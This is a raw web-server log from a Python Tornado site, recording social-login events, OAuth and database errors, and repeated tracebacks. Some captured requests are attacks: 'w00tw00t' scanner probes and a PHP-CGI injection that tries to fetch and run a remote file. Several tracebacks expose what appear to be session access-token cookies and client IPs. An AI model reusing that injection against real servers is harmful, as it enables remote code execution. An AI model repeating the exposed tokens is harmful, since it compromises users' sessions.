WARNING:root:404 GET /info//?gtnjs=12931190251a2155976b1807fe69f4c41ff4836a3a (127.0.0.1) 0.80ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 50709cbe8e4c850b0b5d42cb has successfully logged in.
INFO:intheory-8002:Facebook user with id 50709cbe8e4c850b0b5d42cb has successfully logged in.
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.80ms
WARNING:root:404 GET /search/tsc.php?&ses=12880767416af0cdf3cbe6eb66e5f16d3bba37c29a&200=Nzk0NjYyNTM=&21=NjYuMjQ5LjY2LjIwMg==&681=MTI4ODA3Njc0MTZhZjBjZGYzY2JlNmViNjZlNWYxNmQzYmJhMzdjMjlh&682=&616=&crc=a495275ce5c8c7c7f91ed1ffa334b50c2fa85e4a&cv=1 (127.0.0.1) 1.39ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.76ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 1.35ms
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
intheory.co.uk
INFO:intheory-8001:intheory.co.uk
intheory.co.uk
INFO:intheory-8003:intheory.co.uk
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (87.229.112.210) 0.91ms
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5071ef7b8e4c85473224fab2 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5071ef7b8e4c85473224fab2 has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (87.229.112.210) 0.83ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 5071f6118e4c854ffe479a27 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5071f6118e4c854ffe479a27 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.73ms
WARNING:root:403 POST /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://bhairahawa.biz/api.gif%20-n/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://bhairahawa.biz/api.gif%20-n (127.0.0.1): '_xsrf' argument missing from POST
WARNING:root:403 POST /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://bhairahawa.biz/api.gif%20-n/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://bhairahawa.biz/api.gif%20-n (127.0.0.1) 1.56ms
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 50723c268e4c855a131320d0 has successfully logged in.
INFO:intheory-8001:Facebook user with id 50723c268e4c855a131320d0 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8001:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8000:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5072cbc18e4c855a2755404f has successfully logged in.
INFO:intheory-8003:Facebook user with id 5072cbc18e4c855a2755404f has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8002:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.facebook.com/', 'X-Real-Ip': '188.223.43.69', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDaDNBTnVScXNVdjlGWWRaQzE5TEZDVjdwUkE3ZGJ1N3dBRHZoNVZVMUZzZTY1d0NONm4xdk1lSUdOWkNLUkpoZHRaQVEwdkxKRVpCQjAyeEt4d1laQjZhRlNGZVpDUVpEWkQ=|1348007605|b0adf8c663b7f4f9626b93459fcded6a1665ebfb"; _xsrf=512a588714ee47d6ada075f85accec65; __utma=188782963.1632723420.1348007382.1348007382.1348007382.1; __utmz=188782963.1348007382.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 60.64ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDaDNBTnVScXNVdjlGWWRaQzE5TEZDVjdwUkE3ZGJ1N3dBRHZoNVZVMUZzZTY1d0NONm4xdk1lSUdOWkNLUkpoZHRaQVEwdkxKRVpCQjAyeEt4d1laQjZhRlNGZVpDUVpEWkQ=|1348007605|b0adf8c663b7f4f9626b93459fcded6a1665ebfb"; _xsrf=512a588714ee47d6ada075f85accec65; __utma=188782963.1632723420.1348007382.1348007382.1348007382.1; __utmz=188782963.1348007382.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '188.223.43.69'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.79ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDaDNBTnVScXNVdjlGWWRaQzE5TEZDVjdwUkE3ZGJ1N3dBRHZoNVZVMUZzZTY1d0NONm4xdk1lSUdOWkNLUkpoZHRaQVEwdkxKRVpCQjAyeEt4d1laQjZhRlNGZVpDUVpEWkQ=|1348007605|b0adf8c663b7f4f9626b93459fcded6a1665ebfb"; _xsrf=512a588714ee47d6ada075f85accec65; __utma=188782963.1632723420.1348007382.1348007382.1349702360.2; __utmb=188782963.1.10.1349702360; __utmc=188782963; __utmz=188782963.1348007382.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '188.223.43.69'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.81ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.facebook.com/', 'X-Real-Ip': '188.223.43.69', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDaDNBTnVScXNVdjlGWWRaQzE5TEZDVjdwUkE3ZGJ1N3dBRHZoNVZVMUZzZTY1d0NONm4xdk1lSUdOWkNLUkpoZHRaQVEwdkxKRVpCQjAyeEt4d1laQjZhRlNGZVpDUVpEWkQ=|1348007605|b0adf8c663b7f4f9626b93459fcded6a1665ebfb"; _xsrf=512a588714ee47d6ada075f85accec65; __utma=188782963.1632723420.1348007382.1348007382.1349702360.2; __utmb=188782963.1.10.1349702360; __utmc=188782963; __utmz=188782963.1348007382.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.89ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
INFO:intheory-8003:Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 GET /admin/logs (127.0.0.1) 10.33ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8001:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.facebook.com/', 'X-Real-Ip': '83.244.221.226', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.61ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.facebook.com/', 'X-Real-Ip': '83.244.221.226', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 6.28ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348059227.1349702875.4; __utmb=188782963.1.10.1349702875; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 7.03ms
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
